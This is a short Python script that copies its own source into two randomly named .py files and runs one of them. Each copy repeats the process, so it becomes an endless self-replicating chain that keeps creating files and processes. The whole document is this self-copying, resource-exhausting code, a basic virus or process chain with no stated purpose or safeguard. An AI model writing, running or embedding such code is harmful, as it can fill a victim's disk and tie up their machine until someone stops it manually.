I = open(__file__).read()
import random,subprocess,os
NAME = str(random.randint(1,1000000))
NAME2 = str(random.randint(1,1000000))
with open(NAME+'.py','w') as f: # our new pyhton file
    f.write(I)
with open(NAME2+'.py','w') as f: # our new pyhton file
    f.write(I)
my_file = '{}.py'.format(NAME)
process = subprocess.Popen(["python", my_file], shell =False)